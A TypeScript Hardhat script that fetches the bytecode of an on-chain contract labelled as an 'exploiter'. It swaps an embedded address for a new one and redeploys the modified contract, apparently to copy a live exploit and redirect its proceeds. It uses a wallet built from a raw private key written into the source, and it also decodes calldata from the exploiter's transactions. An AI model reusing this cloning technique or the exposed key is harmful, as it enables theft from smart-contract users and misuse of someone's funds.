import { ethers } from "hardhat"
import { providerHTTP } from "./configs"

function findSubstringOccurrences(str: string, substring: string): number[] {
    let indexes: number[] = []
    let index: number = 0

    // Check if the substring is not empty to avoid infinite loop
    if (substring.length === 0) {
        console.error("Substring cannot be empty")
        return indexes
    }

    while (index < str.length) {
        // Find the index of the next occurrence of the substring
        index = str.indexOf(substring, index)
        if (index === -1) break // If no more occurrences are found, exit the loop

        indexes.push(index) // Add the index of the occurrence to the array
        index += 1 // Move past the current occurrence to find the next one
    }

    return indexes
}

function replaceEthereumAddress(input: string, oldAddress: string, newAddress: string): string {
    // Replace the old address with the new address
    return input.replace(oldAddress, newAddress)
}

const main = async () => {
    const exploiterAddress = "0x7B15A342ca8DC73C4b6FB97cad00b67A35c3e5ed"
    const code = await providerHTTP.getCode(exploiterAddress)

    const indexes = findSubstringOccurrences(code, "72")

    const originalCode = code
    const oldAddress = "0F465DcB5dd4f1ab6c90F21Ac9C12ba9627C39b7"
    const newAddress = "0xfB668FB105e3fD78b6c9850380345978Bbace28f"
    const updatedCode = replaceEthereumAddress(originalCode, oldAddress, newAddress)

    const wallet = new ethers.Wallet("a33493529ef960f5ae57b71f8311d6259990e6192e2acc4037b5f0c3bbcb01d2", providerHTTP)

    const ContractFactory = new ethers.ContractFactory([], updatedCode, wallet)

    // Deploy the contract
    const contract = await ContractFactory.deploy()

    // Wait for the contract to be deployed
    await contract.deployed()

    console.log(contract.address)
}

// main()

function splitStringEveryNth(str: string, n: number): string[] {
    const result: string[] = []

    for (let i = 0; i < str.length; i += n) {
        result.push(str.substring(i, i + n))
    }

    return result
}

const main2 = () => {
    const exploiterAddress = "0x7B15A342ca8DC73C4b6FB97cad00b67A35c3e5ed"
    const code = "00000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000009a71012b13ca4d3d0cdc72a177df3ef03b0e76a300000000000000000000000047b489bf5836f83abd928c316f8e39bc0587b02000000000000000000000000000000000000000000000112f385846fcf04614a50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f00010098ef32edd24e2c92525e59afc4475c1242a30184000000447979426b0000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000000"

    console.log(splitStringEveryNth(code, 64))
}

main2()

/**
 *
 0x1a198276
 000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000070000000000000000000000002791bca1f2de4661ed88a30c99a7a9449aa841740000000000000000000000000d500b1d8e8ef31e21c99d1db9a6444d3adf12700000000000000000000000007ceb23fd6bc0add59e62ac25578270cff1b9f619000000000000000000000000c2132d05d31c914a87c6611c10748aeb04b58e8f0000000000000000000000001bfd67037b42cf73acf2047067bd4f2c47d9bfd60000000000000000000000008f3cf7ad23cd3cadbd9735aff958023239c6a063000000000000000000000000ffffffffffffffffffffffffffffffffffffffff
 */

 /**
  * 0xde1923df
  * 00000000000000000000000000000000000000000000000000000000000000a0
  * 00000000000000000000000000000000000000000000000000000000000000c0
  * 0000000000000000000000009a71012b13ca4d3d0cdc72a177df3ef03b0e76a3
  * 00000000000000000000000047b489bf5836f83abd928c316f8e39bc0587b020
  * 00000000000000000000000000000000000000000000112f385846fcf04614a5
  * 0000000000000000000000000000000000000000000000000000000000000000
  * 000000000000000000000000000000000000000000000000000000000000005f
  * 00010098ef32edd24e2c92525e59afc4475c1242a30184000000447979426b0000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000000
  */